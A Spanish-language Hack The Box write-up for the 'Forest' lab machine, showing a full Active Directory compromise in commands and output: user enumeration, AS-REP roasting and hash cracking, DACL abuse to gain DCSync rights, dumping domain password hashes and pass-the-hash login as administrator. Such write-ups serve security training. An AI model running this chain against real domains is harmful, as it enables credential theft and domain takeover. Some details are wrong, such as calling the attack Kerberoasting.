---
tags:
title: Forest - Easy (HTB)
permalink: /Forest-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconociemiento

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49980 10.10.10.161
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 01:58 EDT
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.41s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-09-30 06:05:17Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49980/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-09-29T23:06:15-07:00
|_clock-skew: mean: 2h26m49s, deviation: 4h02m31s, median: 6m48s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-09-30T06:06:16
|_  start_date: 2025-09-30T05:54:57

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.15 seconds
```

# Service Enumeration

## Port 135/593 RPC

```bash
rpcclient -U "" -N 10.10.10.161                                           
rpcclient $> 
```

Con rpcclient nos dejo conectarnos, enumero usuarios con el comando `enumdomusers`.

```bash
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Copoiamos los usuarios a un archivo para perfomar un Kerberoasting attack, y despues con la herramienta `kerbrute`, probamos si son validos a nivel de dominios o si alguno tiene las credenciales revocadas.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/forest/kerbrute]
└─# ./kerbrute userenum --dc 10.10.10.161 -d htb.local ../users       

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/30/25 - Ronnie Flathers @ropnop

2025/09/30 02:21:10 >  Using KDC(s):
2025/09/30 02:21:10 >   10.10.10.161:88

2025/09/30 02:21:10 >  [+] VALID USERNAME:       Administrator@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailboxfc9daad@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailboxc3d7722@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailbox968e74d@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailbox6ded678@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailboxc0a90c9@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailbox670628e@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailboxb01ac64@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailbox0659cc1@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailbox83d6781@htb.local
2025/09/30 02:21:10 >  [+] VALID USERNAME:       HealthMailboxfd87238@htb.local
2025/09/30 02:21:11 >  [+] VALID USERNAME:       sebastien@htb.local
2025/09/30 02:21:11 >  [+] VALID USERNAME:       HealthMailbox7108a4e@htb.local
2025/09/30 02:21:11 >  [+] VALID USERNAME:       lucinda@htb.local
2025/09/30 02:21:11 >  [+] VALID USERNAME:       andy@htb.local
2025/09/30 02:21:11 >  [+] VALID USERNAME:       mark@htb.local
2025/09/30 02:21:11 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-alfresco@HTB.LOCAL:1ea27e917d3bdc626087fb9ce1eb049d$9830831f9bcc01ad006105e8e03bd82433fe8ef26367e00481a3ae48d46b9b5d01f98fbb7f9eaae53d49d7df6450c6bba4aa62053eca7e2f6d723723fa0f97c96645f078a872013c3f38cec71743faae9c22cc0969b1637818b2f6b24cad8521230785810b9763facf6262cceab1454064a38cb6722f6e2dfb5363c99e0ffe51cf38cdd0eed873115f3cb813233f96a1ad962a72f7ef0e6e686053d1ac90915bd5bcce2d10c0b8d7c5f1bee6c4199c7fbad1cdaa07497ee27dbc0f40138339bd3d6de39b3a1d8c06c6b0a30ce45919f0c78dc47c8809ce75a08dca3e16c33256e0728ae40183b5b68e185402be4497a7d2960b649a7ea65855b3                                                                                                                                                                                          
2025/09/30 02:21:11 >  [+] VALID USERNAME:       svc-alfresco@htb.local
2025/09/30 02:21:11 >  [+] VALID USERNAME:       santi@htb.local
2025/09/30 02:21:11 >  Done! Tested 44 usernames (18 valid) in 1.915 seconds
```

Veo que con exito me proporciona un hash en formato `aes-256`, ahora con `hashcat`, lo voy a romper.

```bash
hashcat -m 18200 hash -a 0 /usr/share/wordlists/rockyou.txt                                                                           
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 5625/11251 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 516 MB (9994 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:1a964dbb52d5864be81547c947332a36$b733e5d368f8784500b5a283d02a4d75edc34f4523e780def8d562233bb56ccea8cba3da1fc0c880aa0d8077d3212d8740b0d840f2bf1a6693bf339053ed5196bd0daccc66c25da7797e445cc07fa68a3ab1ede0fe0dcc342d1015c9439570c91dfb3a15ac91f2f01a177e303aa55c644e7ce13c836d9bd20b7842f62b9eb58cdca2db97b96d6246083a006f3ffc238d5fdced48db712c610e05ad2f24624b726f1ecbd5409645e7dd45152bd3a2c5d25b43938fd7c64bd0dd52369755687a8c0b7891e70a118c276b8f5c4174349b276dd22042ada2941099110860bc38b336d2a7e66f6f5e:s3rvice
```

Me dio la contraseña `s3rvice` para el usuario `svc-alfresco`, ya una veez tenemos credenciales validas voy a enumerar el dominio por completo con `bloodhound-python`.

```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/forest]
└─# bloodhound-python -c all -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (FOREST.htb.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 01M 14S
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/forest]
└─# ls
20250930024028_computers.json   20250930024028_gpos.json    20250930024028_users.json          extractPorts.sh  impacket-0.12.0.tar.gz  nmap_scan
20250930024028_containers.json  20250930024028_groups.json  bloodhound-cli                     hash             kerbrute                users
20250930024028_domains.json     20250930024028_ous.json     bloodhound-cli-linux-amd64.tar.gz  impacket-0.12.0  mimikatz.exe
```

Una vez que tenemos los archivos `.json` los subimos a la GUI de `bloodhound`, si trazo el camino mas corto hacia el `Domain Admin` del dominio que es el user `administrator`.

![[Untitled 25 1.jpg]]

Veo que el usuario `svc-alfresco` forma parte del grupo `Service Account` y a su vez este grupo forma parte de `Privilege IT Accounts` y este grupo tambien forma parte de `Account Operators` el cual tiene permisos `GenericAll` sobre el grupo `Exchange Windows Permissions` y este tiene el permiso `WriteDacl` sobre el dominio.

Hasta ahora mi idea es agregar un usuario al grupo `Exchange Windows Permissions` y asi despues poder abusar de las `DACL` para darme privilegios `DCSync` sobre el dominio

Me agrego al grupo que mencione antes. 

```bash 
net group Exchange Windows Permissions svc-alfresco /add
```

Y luego con la herramienta `dacledit` de impacket nos otorgamos privilegios `DCSync` sobre el dominio. Para despues poder dumpear los hashes de todos los usuarios de dominio.

```bash
bloodyAD --host htb.local -d htb.local -u svc-alfresco -p s3rvice add groupMember 'EXCHANGE WINDOWS PERMISSIONS' svc-alfresco
[+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS

<SNIP>

impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=HTB,DC=LOCAL' 'htb.local'/'svc-alfresco':'s3rvice'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250930-032719.bak
[*] DACL modified successfully!
```

Ahora paso a usar `secretsdump`para realizar la accion anteriormente mencionada.

```bash
impacket-secretsdump -just-dc htb.local/svc-alfresco:s3rvice@10.10.10.161                                                  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
```

Y ahora debido a que el puerto 5985 no esta abierto el cual perteneces al Servicio de administracion remota de Windows, podemos conectarnos al dominio via `smb` o usando tambien las herramientas `wmiexec` o `psexec` de impacket.

```bash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

```bash
C:\ whoami
htb/administrator
```

Y ya podemos visualizar las flags tanto de `administrator` como de `svc-alfresco`.

